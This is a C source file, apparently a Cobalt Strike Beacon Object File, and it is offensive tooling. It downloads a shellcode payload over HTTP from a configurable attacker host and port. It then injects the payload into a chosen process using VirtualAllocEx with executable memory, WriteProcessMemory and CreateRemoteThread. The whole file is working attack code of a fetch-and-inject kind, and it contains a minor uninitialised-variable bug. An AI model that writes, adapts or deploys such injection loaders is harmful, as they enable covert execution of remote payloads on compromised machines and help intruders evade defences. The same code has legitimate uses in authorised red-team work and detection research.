#include <windows.h> 
#include <winhttp.h> 
#include <stdio.h> 
#include "beacon.h"

DWORD calcBuff(DWORD buffSize, DWORD dwSize) {
    buffSize += dwSize;
    return buffSize;
}

LPVOID decrementBuffer(LPVOID pBuffer, DWORD dwSize) {
    LPBYTE pByte = (LPBYTE)pBuffer;
    pByte -= dwSize;
    LPVOID pNewBuffer = (LPVOID)pByte;
    return pNewBuffer;
}

LPVOID incrementBuffer(LPVOID pBuffer, unsigned long buffer) {
    LPBYTE pByte = (LPBYTE)pBuffer;
    pByte += buffer;
    LPVOID pNewBuffer = (LPVOID)pByte;
    return pNewBuffer;
}

//Function declarations
DECLSPEC_IMPORT INT WINAPI USER32$MessageBoxA(HWND, LPCSTR, LPCSTR, UINT);

DECLSPEC_IMPORT WINBASEAPI LPVOID    WINAPI KERNEL32$VirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
DECLSPEC_IMPORT WINBASEAPI BOOL      WINAPI KERNEL32$WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
DECLSPEC_IMPORT WINBASEAPI HANDLE    WINAPI KERNEL32$CreateRemoteThread(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
DECLSPEC_IMPORT WINBASEAPI HANDLE    WINAPI KERNEL32$OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);

WINBASEAPI void *__cdecl MSVCRT$malloc(size_t size);
WINBASEAPI void *__cdecl MSVCRT$free(void *memblock);
WINBASEAPI void  __cdecl MSVCRT$memset(void *dest, int c, size_t count);
#define intZeroMemory(addr,size) MSVCRT$memset((addr),0,size)

DECLSPEC_IMPORT WINHTTPAPI HINTERNET WINHTTP$WinHttpOpen(LPCWSTR pszAgentW, DWORD dwAccessType, LPCWSTR pszProxyW, LPCWSTR pszProxyBypassW, DWORD dwFlags);
DECLSPEC_IMPORT WINHTTPAPI HINTERNET WINHTTP$WinHttpOpenRequest(HINTERNET hConnect, LPCWSTR pwszVerb, LPCWSTR pwszObjectName, LPCWSTR pwszVersion, LPCWSTR pwszReferrer, LPCWSTR *ppwszAcceptTypes, DWORD dwFlags);
DECLSPEC_IMPORT WINHTTPAPI BOOL      WINHTTP$WinHttpSendRequest(HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength, DWORD dwTotalLength, DWORD_PTR dwContext);
DECLSPEC_IMPORT WINHTTPAPI BOOL      WINHTTP$WinHttpReceiveResponse(HINTERNET hRequest, LPVOID lpReserved);
DECLSPEC_IMPORT WINHTTPAPI BOOL      WINHTTP$WinHttpQueryDataAvailable(HINTERNET hRequest, LPDWORD lpdwNumberOfBytesAvailable);
DECLSPEC_IMPORT WINHTTPAPI BOOL      WINHTTP$WinHttpReadData(HINTERNET hRequest, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead);
DECLSPEC_IMPORT WINHTTPAPI HINTERNET WINHTTP$WinHttpConnect(HINTERNET hSession, LPCWSTR pswzServerName, INTERNET_PORT nServerPort, DWORD dwReserved);
DECLSPEC_IMPORT WINHTTPAPI BOOL      WINHTTP$WinHttpQueryHeaders(HINTERNET hRequest, DWORD dwInfoLevel, LPCWSTR pwszName, LPVOID lpBuffer, LPDWORD lpdwBufferLength, LPDWORD lpdwIndex);
DECLSPEC_IMPORT WINHTTPAPI BOOL      WINHTTP$WinHttpCloseHandle(HINTERNET hInternet);

//https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpconnect
/* entry point */
void go(char * args, int length) {
    datap  parser;
    int    pid;
   
    BeaconDataParse(&parser, args, length);
    pid = BeaconDataInt(&parser);
    
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Injecting to PID: %d\n", pid); //WEIRD ERROR ON RETRIEVING THE PID
    
    //--------- CONFIGURE -----------
    LPCWSTR remotehost = L"192.168.0.x"; //change to your IP
    int remoteport = 8081; //change to your port
    LPCWSTR remotedir = L"/beacon.bin"; //change to your directory of the hosted bin file
    //-------------------------------

    // Initialize variables 
    LPVOID pBuffer;
    DWORD buffSize;
    LPVOID lpvAddr = 0;
    HINTERNET hInternet;
    HINTERNET hHttpSession;
    HINTERNET hHttpConnection;
    HINTERNET hHttpRequest;
    DWORD dwSize;
    BOOL bResults;
    DWORD dwStatus;
    DWORD dwStatusSize;
    DWORD dwDownloaded = 0;
    DWORD dwContentLength = 0;
    char* pszOutBuffer;

    // Initialize WinHTTP (change the first argument to a valid User-Agent instead)
    hInternet = WINHTTP$WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] WinHTTP initialized\n");

    // Connect to the HTTP server 
    hHttpSession = WINHTTP$WinHttpConnect(hInternet, remotehost, remoteport, 0);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Connected to HTTP Server\n");

    // Open an HTTP request 
    hHttpRequest = WINHTTP$WinHttpOpenRequest(hHttpSession, L"GET", remotedir, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    BeaconPrintf(CALLBACK_OUTPUT, "Sending HTTP GET Request\n");

    // Send a request 
    bResults = WINHTTP$WinHttpSendRequest(hHttpRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    BeaconPrintf(CALLBACK_OUTPUT, "WinHTTP request sent\n");

    // Wait for the response 
    bResults = WINHTTP$WinHttpReceiveResponse(hHttpRequest, NULL);
    BeaconPrintf(CALLBACK_OUTPUT, "Response retrieved\n");


    // Get the Length of the response.
    if (bResults)
    {
        DWORD dwHeaderSize = sizeof(DWORD);
        bResults = WINHTTP$WinHttpQueryHeaders(hHttpRequest, WINHTTP_QUERY_CONTENT_LENGTH | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX, &dwContentLength, &dwHeaderSize, WINHTTP_NO_HEADER_INDEX);
    }

    HANDLE processHandle = KERNEL32$OpenProcess(
		PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
		FALSE,
		(DWORD)pid
	);
	
    pBuffer = KERNEL32$VirtualAllocEx(processHandle, NULL, dwContentLength, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    BeaconPrintf(CALLBACK_OUTPUT, "Buffer: %p\n", pBuffer);

    do
    {
        dwSize = 0;
        if (!WINHTTP$WinHttpQueryDataAvailable(hHttpRequest, &dwSize))
        {
            
            BeaconPrintf(CALLBACK_OUTPUT, "Error in WinHttpQueryDataAvailable.\n");
        }

        // Allocate space for the buffer.
        //pszOutBuffer = new char[dwSize + 1];
        //this is the C version
        pszOutBuffer = (char*)MSVCRT$malloc(dwSize + 1);

        // No more available data 
        if (!pszOutBuffer) {
            BeaconPrintf(CALLBACK_OUTPUT, "[-] No more available data");
            dwSize = 0;
        }

        // Read the Data.
        intZeroMemory(pszOutBuffer, dwSize + 1);

        if (!WINHTTP$WinHttpReadData(hHttpRequest, (LPVOID)pszOutBuffer,
            dwSize, &dwDownloaded))
            BeaconPrintf(CALLBACK_OUTPUT, "Error in WinHttpReadData.\n");
        else
            // Copy the shellcode into it.
            KERNEL32$WriteProcessMemory(processHandle, pBuffer, (PVOID)pszOutBuffer, (SIZE_T)dwSize, (SIZE_T *)NULL);
            pBuffer = incrementBuffer(pBuffer, dwSize);
            buffSize = calcBuff(buffSize, dwSize);

        // Free the memory allocated to the buffer.
        //uncommented since it's a C++ thingy
        //delete[] pszOutBuffer;
        MSVCRT$free(pszOutBuffer);


    } while (dwSize > 0);

    pBuffer = decrementBuffer(pBuffer, buffSize);

    //Callback function to launch a thread on the buffer address
    KERNEL32$CreateRemoteThread(processHandle, NULL, 0, pBuffer, NULL, 0, NULL);
    
    //USER32$MessageBoxA(NULL, "4", "1", 0);

    // Close the HTTP request 
    WINHTTP$WinHttpCloseHandle(hHttpRequest);

    // Close the session 
    WINHTTP$WinHttpCloseHandle(hHttpSession);

    // Cleanup 
    WINHTTP$WinHttpCloseHandle(hInternet);
}

